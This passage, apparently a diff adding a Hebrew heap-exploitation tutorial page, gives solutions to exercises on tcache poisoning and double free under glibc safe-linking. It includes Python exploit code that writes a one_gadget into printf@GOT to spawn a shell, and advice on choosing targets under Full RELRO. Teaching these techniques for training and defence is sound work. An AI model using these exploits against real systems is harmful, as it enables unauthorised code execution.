+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one</span><span class="p">))</span>               <span class="c1"># returns a chunk on printf@got -&gt; writes one_gadget</span>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="c1"># this allocation calls printf(&quot;data: &quot;) before the write (printf is still valid),</span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="c1"># and then writes one_gadget to the GOT. The next call to printf (the menu) fires the gadget.</span>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>מריצים ומקבלים shell גם על 2.35. אם ה-shell לא נפתח, כמעט תמיד זה אחד משניים: אילוץ ה-one_gadget לא מתקיים (בדקו ב-gdb על כתובת ה-gadget את האוגרים והמחסנית - בחרו gadget אחר), או שהיעד לא aligned ל-16 (<code>unaligned tcache chunk detected</code> - בחרו כניסת GOT אחרת).</p>
+<p>למה זה עבד: ה-safe-linking אילץ אותנו לשני צעדים נוספים - leak heap וערבול ה-<code>next</code>. את leak ה-heap קיבלנו במתנה מה-safe-linking עצמו: צ'אנק בודד ששוחרר שומר <code>next = (mem&gt;&gt;12) ^ 0 = mem&gt;&gt;12</code>, כלומר את הכתובת שלו מוזזת ב-12. משם ערבלנו את היעד עם <code>encrypt</code>, ובגלל ש-<code>__free_hook</code> נעלם עברנו ליעד GOT עם one_gadget.</p>
+<p>איך להכליל: על 2.34+ תמיד בדקו איזה יעד קיים. אם Partial RELRO - GOT. אם Full RELRO - מבני FILE (House of Apple), מטפלי exit, או הקצאה על המחסנית דרך <code>environ</code>.</p>
+<h3 id="6-edit">פתרון תרגיל 6 (אתגר) - שחרור כפול טהור בלי edit<a class="headerlink" href="#6-edit" title="Permanent link">&para;</a></h3>
+<p>כשאין <code>edit</code>, הדרך היחידה לכתוב ל-<code>next</code> היא דרך ה-<code>data</code> של <code>malloc</code> - ובדיוק בשביל זה השחרור הכפול קיים: הוא נותן <code>malloc</code> שמחזיר צ'אנק שעדיין ראש ה-bin. הרצף:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># bypass the key check without edit: fastbin dup or freeing with an intermediate chunk</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="c1"># here we assume we managed to bypass the key (in practice: fill tcache and move to fastbin)</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                                <span class="c1"># bin: [0]        count 1</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># ... key bypass (fastbin dup / indirect overwrite) ...</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                                <span class="c1"># bin: [0]-&gt;[0]   count 2  (double free)</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">target</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>                <span class="c1"># some target (16-byte aligned)</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="c1"># alloc returns 0, and the data is written into the same memory that is still the head of the bin:</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>            <span class="c1"># 0.next &lt;- target (via the data, not edit!)</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>                 <span class="c1"># returns 0 again, head of the list = target</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>        <span class="c1"># returns a chunk on target -&gt; hijack</span>
+</code></pre></div>
+<p>ההבדל מהמסלול עם <code>edit</code>: כאן ה-<code>data</code> של ההקצאה <code>alloc(p, 1, ...)</code> הוא מה ששותל את ה-<code>next</code> המורעל, כי הצ'אנק שהוקצה הוא בו זמנית עדיין ראש ה-bin (זו בדיוק המתנה של השחרור הכפול). על 2.32+ צריך גם כאן לערבל את ה-<code>next</code> עם <code>encrypt</code> ולהשיג leak heap כמו בתרגיל 5.</p>
+<p>מתי כל מסלול עדיף: אם יש UAF edit - עדיף (פשוט וקצר, לא צריך שחרור כפול בכלל). אם אין edit אבל יש שליטה בתוכן של הקצאה חדשה - השחרור הכפול הוא הגשר שהופך את זה להרעלה.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
